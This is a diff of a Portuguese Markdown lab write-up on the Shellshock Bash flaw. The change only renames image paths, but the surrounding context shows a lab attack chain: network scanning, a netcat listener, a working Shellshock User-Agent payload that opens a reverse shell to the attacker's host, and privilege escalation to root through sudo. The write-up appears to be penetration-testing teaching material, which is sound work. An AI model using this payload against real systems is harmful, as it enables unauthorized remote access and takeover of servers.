@@ -323,7 +323,7 @@ O "Shellshock" explora uma falha na forma como o Bash processa definições de f
 sudo nmap -sn 10.0.2.0/24
 ```  
 
-![image info](./imagens_bash/ip_vitima(2).png)
+![image info](./imagens/ip_vitima(2).png)
 
 2. Verificação (Reconnaissance): Confirmação de que o script CGI existe e está acessível.
 
@@ -333,7 +333,7 @@ curl -I http://10.0.2.4/cgi-bin/status
 ***-I*** → Head request
 
 
-![image info](./imagens_bash/verificar_porta_aberta(3).png)
+![image info](./imagens/verificar_porta_aberta(3).png)
 
 3. Exploração e Acesso Inicial (Reverse Shell): Injeção do payload malicioso no cabeçalho User-Agent para forçar o servidor a conectar-se ao atacante (Kali) via Netcat.
 
@@ -349,7 +349,7 @@ nc -lvnp 4444
 
 ***-p*** 4444 → porta TCP em que o NetCat onde vai ouvir  
 
-![image info](./imagens_bash/escuta(reserve_shell_handler)_(4).png)
+![image info](./imagens/escuta(reserve_shell_handler)_(4).png)
 
 Disparo do Exploit:
 
@@ -358,9 +358,9 @@ curl -H "User-Agent: () { :; }; echo; /usr/bin/nc 10.0.2.200 4444 -e /bin/bash" 
 ```
 ***-e /bin/bash*** → Anexa um shell ao NetCat (reverse shell)
 
-![image info](./imagens_bash/connect_vitima(5).png)
-![image info](./imagens_bash/connect_pentester(7).png)
-![image info](./imagens_bash/whoami(8).png)
+![image info](./imagens/connect_vitima(5).png)
+![image info](./imagens/connect_pentester(7).png)
+![image info](./imagens/whoami(8).png)
 
 4. Estabilização e Escalada de Privilégios: Após obter a shell como utilizador pentesterlab, a shell foi estabilizada e os privilégios foram elevados para root explorando permissões de sudo ou vulnerabilidades de Kernel.
 
@@ -369,7 +369,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 sudo -s
 # (Ou via Kernel Exploit Dirty COW se necessário)
 ```
-![image info](./imagens_bash/root.png)
+![image info](./imagens/root.png)
 
 
 ### Mitigação da Vulnerabilidade
